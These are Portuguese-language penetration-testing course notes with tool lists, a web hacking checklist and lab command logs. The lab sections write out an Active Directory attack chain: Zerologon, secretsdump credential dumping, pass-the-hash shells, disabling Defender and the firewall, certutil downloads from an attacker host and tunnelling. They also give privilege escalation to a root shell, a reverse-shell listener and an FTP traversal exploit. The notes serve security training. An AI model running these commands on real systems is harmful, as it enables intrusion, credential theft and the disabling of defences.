Soluções DAST: OwaspZap, Niktop, Wapiti, AppScan, N-Stalker, NetSparker, WebKing, Retina WSS, Acunetix, WebSecurify, Nessus, NeXpose, ParosPro, HCL AppScan, 

WiGLE = Ferramenta que busca redes abertas e informações dos WiFI [WiGle](https://wigle.net)

[HORUSEC](https://horusec.io/site/) Ferramenta de SAST que busca falhas de segurança enqanto está desenvolvendo, integrado a IDE, PipeLine. SNYK e VCG também são ferramentas com o mesmo proposito.

`SEtoolkit` É uma ferramenta de Engenharia social que auxilia na utilização das técnicas

`zphisher` Ferramenta de phising e engenharia social.

`ldb -h` Ferramenta de LoadBalancig para verificar os dominios

Ferramentas de scan de vulnerabilidades WEB: `Arachni - Skipfish - Grabber - Wapiti - ZAP - Metasplois`

Ferramenta para compartilhar aquivos na rede de forma fácil `impacket-smbserver -smb2support pentest -username user -password pass`

Cloud Federation é a combinação de infraestrutura, serviços de plataform e softwares que podem aumentar o risco de ataque

Auditar a nuvem: ferramentas que auxiliam nesse processo: `ScoutSuite` Open source, `Prowler` somente AWS, `Pacu` para AWS, `Cloud custodian` auxilia na criaação de políticas

Ferramenta para ataque de wifi automatizado `Kismet`

Ataques BlueTooth: `Bluejacking` ferramenta usada para enviar mensagens indesejadas, videos usando o bluetooth. `Bluesnarfing` Ataque mais perigoso que pode roubar informaçoes do dispositivo vai bluetooth

`Ettercap` Ferramena que pode ser utilizada para ataques de Man in The middle e em aplicativos mobile. `Android SDK tools` ferramenta para análise de aplicativos mobile

Ferramenta online para análise de aplicativos `mobsf.live`

Ferramenta online de análise de malware `cuckoosandbox.org` `any.run`

Ferramentas de examinar códigos `Frida`,`Objection` análises avançadas de dispositivos, aplicativos e códigos e identifica root do android e JailBreak do iOS

`netdiscover` ferramenta de descoberta de ativos na rede

- PRATICA Anotação do [Thiago Muniz](/pentest+notes-prof)

Arquvios

Documento com o SAMM [Software Assurance Maturity Model](/SAMM-v2-PDF.pdf) auxilia na melhoria de postura de segurança de software, eleva a maturidade de cibersegurança da empresa.

Solução lab com 3 maquinas que faz escalção em duas delas: [Acesso ao pdf](/LAB-PENT+-SOLUCAO.pdf)

Alguns comando passados de forma prática usando o laboratório da acadi

	smbmap -H 192.168.20.44 -r Shares

Ferramenta similar ao smbclient só que não interage com o serviço, busca se tem compartilhamento ativo

	nslookup
	set q=ns
	zonetransfer.me
	server nsztm1.digi.ninja
	ld -s zonetransfer.me
	server nsztm2.digi.ninja
	ld -s zonetransfer.me

Processo de transferencia de zona de forma manual

	metagoofil -d comptia.org -t pdf -l 75

Ferramenta de modificação e leitura de Metadados de arquivos

	nmap -sS --script 'ldap* and not brute' 192.168.200.44 -p 389
	nmap -sV --script nbstat -p 137,445
	dig any enumeration.local @192.168.200.44
 	dig axfr enumeration.local @192.168.200.44
	dig a offsec @192.168.200.253
	dig ptr 192.168.200.252 @192.168.200.253
	host -t axfr enumeration.local 192.168.200.44
	snmp-check 192.168.200.44
	dig -x 192.168.200.252 @192.168.200.253 (descobre hostname)
	dnsrecon -r 192.168.200.0/24 -n 192.168.200.253 (descobre os hostnames da rede - 253 é o DNS - caso nao exista um serviço atrelado ao subdominio - subdomain takeover)
	nmap --script ldap-rootdse IP (captura informações do DNS e hostname)
 
Comandos para enumerar dominio e transferencia de zona, hostnames

	redis-cli -h 192.168.200.44

Fazer uma busca e enumeraçã no redis

	nmap -Pn 192.168.200.44 --script --rsync-list-modules
	rsync --list-only rsync://192.168.200.44/backup/etc/passwd
 	rsync --chavzP --stats rsync://192.168.200.44/backup/etc/passwd/ .

Vulnerabilidade de command Injection

 	nc -vnlp -s 127.0.0.1
	
Ao tentar realizar uma shell reversa. Esse comando quando usado com o NGROK serve para forçar a conexão localhost que é onde a ferramenta funciona.

	script -qc /bin/bash /dev/null
	EXPORT TERM=xterm
	Ctrl Z
	stty raw -echo:fg
 	reset

Shell mais interativa

Note: Quando der erro da biblioteca "GLIBC" do unzip no gtfobins SUID na escalação de privilegios, na maquina alvo `cp /bin/sh .` joga o arquivo sh para o atacante `chmod +sx sh` depois `zip shell.zip sh` joga o arquivo para o alvo e `./unzip -K shell.zip`.

Capabilities são funções especiais para arquivos, usuários, kernel etc. COmo se fosse uma GPO para dar poderes especiais dentro do sistema específico. Exemplo abaixo, com o python

	getcap -r /usr/
	python3.10 -c 'import os; os.setuid(0); os.system("/bin/bash")'

O primeiro lista as capabilities que existem no sistema, o segundo executa o python pois estava listado no capabilities, troca o UID do usuário para 0 (que é o root) e drop a shell.

Script nmap que anumera usuários do Active Directory AD `krb5-enum-users` na porta 88 `sudo nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='mtia.local' 192.168.200.100`

- Laboratório do AD

IP 253 é o AD [FullNotes](/FILES/lab-ad-pplus) LIVE - [YouTube](https://youtu.be/U80M7Lp1w4E)

	crackmapexec smb 192.168.200.253 -L
	crackmapexec smb 192.168.200.253 -M zerologon
 	git clone https://github.com/dirkjanm/CVE-2020-1471
	impacket-secretsdump -just-dc offsec/offsec-ad\$@192.168.200.253 (Dumpa as creds do AD)
	crackmapexec smb 192.168.200.253 -u administrator -H 'f2535a22448907ddffad7bddef5c53e2'
	impacket-psexec -hashes 'aad3b435b51404eeaad3b435b51404ee:f2535a22448907ddffad7bddef5c53e2' offsec.corp/administrator@192.168.200.253 (joga executavel)
	impacket-wmiexec -hashes 'aad3b435b51404eeaad3b435b51404ee:f2535a22448907ddffad7bddef5c53e2' offsec.corp/administrator@192.168.200.253 ipconfig (roda comando)
	vil-winrm -H 'f2535a22448907ddffad7bddef5c53e2' -u administrator -i 192.168.200.253 (fecha uma shell)
	No SERVIDOR AD- Abaixa desabilita o monitoramento em tempo real do windows defender
 	get-mppreference | findstr Monitoring (Se o resultado for FALSE)
	set-mppreference -disablerealtimemonitoring $true (Seta como true)
	NO ATACANTE impacket-psexec -hashes "aad3b435b51404eeaad3b435b51404ee:f2535a22448907ddffad7bddef5c53e2" "offsec.corp/administrator"@192.168.200.253 (com o FW desabiltiado funciona)
	netsh advfirewall set allprofiles state off (desabilita firewall para todos)
	1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.0.0.100",$_)) "Port $_ is open!"} 2>$null (faz um portscan 1024, rodar no winrm)
 	wget https://raw.githubusercontent.com/BornToBeRoot/PowerShell_IPv4PortScanner/refs/heads/main/Scripts/IPv4PortScan.ps1 (binario para scan de porta)
	certutil -urlcache -f http://192.168.200.133/IPv4PortScan.ps1 IPv4PortScan.ps1
	PS .\IPv4PortScan.ps1 -computer 192.168.200.252 -StartPort 445 -EndPort 445 (scan de portas)
	CMD powershell -c ".\IPv4PortScan.ps1 -computer 192.168.200.252 -StartPort 445 -EndPort 445" (scan de portas)
	baixa do site (https://securesocketfunneling.github.io/ssf/#download)
	certutil -urlcache -f http://192.168.200.133/ssf.zip ssf.zip
	expand-archive ssf.zip -destinationpath ssf
	AD IMPACKET-WMIEXEC .\ssfd.exe -p 1111
	KALI /ssf -D 2222 -p 1111 192.168.200.253 # CONECTA NA PORTA 1111 DO SERVIDOR E ABRE A PORTA 5555 DO LADO DO KALI PARA FECHAR A CONEXÃO
	KALI proxychains -q impacket-wmiexec -hashes “aad3b435b51404eeaad3b435b51404ee:f2535a22448907ddffad7bddef5c53e2” “offsec.corp/administrator”@192.168.200.252 hostname
	proxychains -q impacket-wmiexec -hashes “aad3b435b51404eeaad3b435b51404ee:f2535a22448907ddffad7bddef5c53e2” “offsec.corp/administrator”@192.168.200.252
	AD dir type proof.txt
	AD where /r c: proof.txt ou dir /s proof.txt
	AD type c:\proof.txt
	powershell -c ‘Set-ItemProperty -Path “HKLM:\System\CurrentControlSet\Control\Terminal Server” -name “fDenyTSConnections” -value 0’ (HABILITA RDP)

- Teorias

Spoofing é o ato de falsificar algo

LOBAS - Usar recurso do proprio sistema para fins maliciosos [LOBAS](https://lolbas-project.github.io/#)

LFI - O arquivo ta na maquina da vitima
RFI - O Arquivo pode ser acessado atravez de um paramentro em uma maquina remota `param?http://localhost/shell.php` O mesmo nao pode passar parâmetro, pois quebra a URL por conta do ?

NOTA: Em um dos laboratórios com a descoberta de portas e serviços, havia um serviço RPC... e na numeração do NMAP havia uma pista no scripts do NMAP, `rpc.py` ao pesqisarmos por exploit, existe um exploit que explora a vulnerabilidade. No segundo lab 201 encontramos um serviço de FTP aberto e com a versão 2.8, ao procurar por exploits na internt encontramos um que ao escutar com `nc -vnlp 1258` e depois interagindo com o FTP com TELNET executa `PORT 127,0,0,1,1,1002` depois `RETR ../../../../../../../etc/passwd`

Moving between VLANS - Pra mover entre VLANs é preciso realizar um ataque MACOF que causa um overflow na tabela MAC em um switch vulnerável

On-Path Attach é o mesmo que Man in The Middle na literatura da EcCouncil

## Hacking CheckList

Mapear Superfície Externa
 
	Pesquisa - Google Hacking
	Pesquisa - Bing Hacking
	Pesquisa - Whois
	Pesquisa - RDAP
	Pesquisa - IP (NetBlock)
	Pesquisa - BGP (ASN)
	Pesquisa - Shodan
	Pesquisa - Censys (pegar delathes do cert SSL)
	Pesquisa - WayBackMachine
	Pesquisa - Certificados SSL
	Pesquisa - Leaks em Bases Públicas
	Pesquisa Passiva - Sub-domínios
	Brute Force - DNS
	Brute Force - DNS Reverso
	Verificar - Transferência de Zona DNS
	Verificar - Registros SPF
	Verificar - Subdomain Takeover
	
Mapear Host(s)
 
	Identificar - Portas Abertas
	Identificar - Serviços Expostos
	Identificar - Interfaces Administrativas
	Verificar - Possibilidade de Brute Force (FTP, SSH, SMB, RPC, RDP)

Mapear Aplicação Web [OWASP](https://ygoralberto.github.io/web)
 
	Identificar - Web Application Firewall
	Identificar - Tecnologia Web Server
	Identificar - Métodos Aceitos
	Identificar - Tecnologia da Aplicação
	Identificar - Robots.txt e sitemap.xml
	Identificar - Comentários HTML
	Identificar - Arquivos JS
	Identificar - Repositórios no GitHub sobre a Empresa
	Realizar - Spidering na aplicação
	Realizar - Identificação de entry points
	Realizar - Brute Force (arquivos, diretórios, logins) bruteforce com Array
	
Controle de Identidade
 
	Spidering sem autenticação
	Spidering autenticado (limitado)
	Spidering autenticado (privilegiado)
	Verificar - Registro de conta
	Verificar - Permissões de Contas
	Verificar - Enumeração de usuários
	
Controle de Autenticação
 
	Identificar - Transporte de dados inseguro
	Identificar - Credenciais padrões
	Identificar - Bloqueio de Contas
	Possibilidade de Brute Force
	Bypass no controle de autenticação
	Análise da Política de Senhas
	Fraquezas nas funcionalidades de senha
	
Controle de Autorização

	Path Traversal/File include
	Server-Side Request Forgery
	Insecure Direct Object Reference
	Escalação de Privilégios
	Bypass no controle de autorização
	
Validação de dados

	Verificar - XSS Refletido
	Verificar - XSS Persistente
	Verificar - DOM Based XSS
	Verificar - HTML Injection
	Verificar - HTTP Parameter Pollution
	Verificar - SQL Injection
	Verificar - LDAP Injection
	Verificar - XML Injection
	Verificar - XPATH Injection
	Verificar - Code Injection
	Verificar - Open Redirect
	Verificar - Bypass File Upload

## ARSENAL HACKING TOOLs
	
	NMAP
	BurpSuite
	OWASPZAP
	GreeBone GVM
	GoBuster
	Sensys
	Shodan
	Subfinder
	Sublist3r
	Assetfinder
	Nikto
	Wapiti
	Nuclei
	Fierce
	Dnsenum
	Dnsrecon
	site securityheaders.com
	WPscan
	SpiderFoot
	Hakrawler
	Katana - Crawler
	WayBackMachine
	TheHarvester
	Wafw00f
	DirSearch
	FeroxBuster
	DirBuster	
	Dirb 
	FFuF
	Wfuzz
	MASSCAN
	Amass
	ARP
	NetworkMiner
	Metasploitable  
	Searchsploit
	SSRFMAP
	Hydra
	Crowbar
	Crunch
	Ncrack
	Medusa
	SSH-Brute-Forcer
	HashCat
	John   
	SSH2john
	ZIP2john 
	Enum4Linux
	Rpcinfo
	Responder 
	SQLMap
	CrackMapExec
	Scapy 
	Wireshark
	Mimikatz 
	Impacket
	NetCat
	Lnkbomb - responder
	Sudo_Killer
	Hunter .io
	Webhook .site
	MxToolBox .com
	Goop git dump
	Chaos
	GHAURL
	Katana gav
	GhaUri - SQLi
	Gau

## THE END
